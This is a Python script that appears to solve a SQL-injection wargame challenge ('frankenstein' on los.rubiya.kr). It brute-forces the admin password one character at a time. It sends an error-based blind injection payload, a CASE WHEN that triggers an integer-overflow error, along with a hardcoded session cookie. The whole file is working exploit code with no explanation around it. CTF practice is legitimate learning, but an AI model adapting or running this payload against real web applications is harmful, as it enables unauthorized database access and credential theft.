import requests

url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?pw="
session = {'PHPSESSID':'j0cgcafpm5c9vtqu3nuuvr3fn8'}
payload2 = ""


for i in range(1,31):
	for j in range(48,123):
		tmp = payload2 + chr(j)
		payload="' or id='admin' and case when pw like '" + str(tmp) + "%' then 0xfffffffffff*0xffffffffffff else 1 end %23"
		#payload += "%23%' then 0xfffffffffff*0xffffffffffff else 1 end %23"
		#print(str(i)+" payload = "+url+payload)
		request = requests.post(url+payload, cookies=session)
		print(request.text)
		if "mysqli" not in request.text:
			flag = 0
			payload2 += str(chr(j))
			break
		else:
			flag = 1
			continue
	if j >123:
		break
print("DONE!!"+payload2)

